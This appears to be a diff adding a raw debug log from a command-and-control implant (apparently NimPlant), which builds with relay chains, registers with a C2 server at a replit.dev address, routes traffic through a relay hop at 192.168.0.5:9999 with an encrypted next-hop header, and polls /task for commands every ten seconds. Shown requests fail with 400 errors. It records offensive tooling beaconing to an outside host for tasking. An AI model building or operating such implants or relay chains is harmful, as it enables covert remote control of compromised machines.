@@ -1,0 +1,66 @@
+[DEBUG] HTTP Relay Build Examples:
+[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay1:8080,c2:5000 DEBUG=1
+[DEBUG]   make darwin_arm64 RELAY_PORT=8080 DEBUG=1
+[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay2:8080,c2:5000 RELAY_PORT=8080 DEBUG=1
+[DEBUG]
+[DEBUG] Current client mode: FAST_MODE
+[DEBUG] Server adaptive mode: NORMAL (2s)
+[DEBUG] No relay address specified - continuing with STANDARD HTTP mode
+[DEBUG] 🚀 Starting HTTP Handler (relay server on-demand only)
+[DEBUG] ✅ Starting async event loop
+[DEBUG] 🚀 Starting HTTP Handler...
+[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed
+[DEBUG] ✅ Starting HTTP handler with safe restart
+[DEBUG] 🔄 Running main loop...
+[MAIN] 🚀 Starting HTTP handler
+[DEBUG] 🌐 Starting async HTTP handler
+[DEBUG] 🌐 HTTP Handler: Relay mode status: false
+[DEBUG] 🆕 HTTP Handler: No stored ID found - performing initial C2 registration
+DEBUG: Attempting to connect to https://3b4f8527-9f97-4987-ba14-6d09429dcb8f-00-3djvoscwrifyv.kirk.replit.dev/register
+DEBUG: doRequest() - Using httpclient for relay
+DEBUG: doRequest() - listenerType: HTTP
+DEBUG: doRequest() - path: /register
+DEBUG: Using first relay hop as target: 192.168.0.5:9999
+DEBUG: doRequest() - target URL: http://192.168.0.5:9999/register
+DEBUG: Encrypted hop chain: 192.168.0.5:9999 -> ICshMiwoJzYpNC4+PD8+OQ==
+DEBUG: Added X-Next-Hop header for relay chain: 192.168.0.5:9999
+DEBUG: doRequest() - About to request()
+DEBUG: doRequest() - request() completed
+DEBUG: doRequest() - Response code: 400
+DEBUG: Response code: 400
+DEBUG: Response body: Missing X-Next-Hop
+[DEBUG] 🌐 HTTP Handler: Implant registered with C2
+[DEBUG] 🌐 HTTP Handler: Starting polling loop with 10s interval
+
+
+
+┌─ 🌐 HTTP HANDLER CYCLE #1
+├─ C2: https://3b4f8527-9f97-4987-ba14-6d09429dcb8f-00-3djvoscwrifyv.kirk.replit.dev:8080 │ Sleep: 10s │ HTTP Relay System
+└─────────────────────────────────────────────────────────
+
+[DEBUG] 🌐 HTTP Handler: Starting polling cycle
+[DEBUG] 🌐 HTTP Handler: Polling C2 for commands (check-in)
+DEBUG: getQueuedCommand() called for implant ID:
+DEBUG: getQueuedCommand() request target: /task
+DEBUG: getQueuedCommand() full URL will be: https://3b4f8527-9f97-4987-ba14-6d09429dcb8f-00-3djvoscwrifyv.kirk.replit.dev/task
+DEBUG: doRequest() - Using httpclient for relay
+DEBUG: doRequest() - listenerType: HTTP
+DEBUG: doRequest() - path: /task
+DEBUG: Using first relay hop as target: 192.168.0.5:9999
+DEBUG: doRequest() - target URL: http://192.168.0.5:9999/task
+DEBUG: Encrypted hop chain: 192.168.0.5:9999 -> ICshMiwoJzYpNC4+PD8+OQ==
+DEBUG: Added X-Next-Hop header for relay chain: 192.168.0.5:9999
+DEBUG: doRequest() - About to request()
+DEBUG: doRequest() - request() completed
+DEBUG: doRequest() - Response code: 400
+DEBUG: getQueuedCommand() response code: 400
+DEBUG: getQueuedCommand() response body: Missing X-Next-Hop
+DEBUG: Connection error, got status code: 400
+DEBUG: getQueuedCommand() final result - GUID:
+DEBUG: getQueuedCommand() final result - Command: NIMPLANT_CONNECTION_ERROR
+DEBUG: getQueuedCommand() final result - Args: @[]
+[DEBUG] 🌐 HTTP Handler: Got command from C2: NIMPLANT_CONNECTION_ERROR
+[DEBUG] 🚫 HTTP Handler: Ignoring internal status message: NIMPLANT_CONNECTION_ERROR
+[DEBUG] 🚫 HTTP Handler: This is NOT a real command, skipping processing
+[DEBUG] 🌐 HTTP Handler: Sleeping for 10000ms (base: 10000ms, jitter: 0ms)
+^C
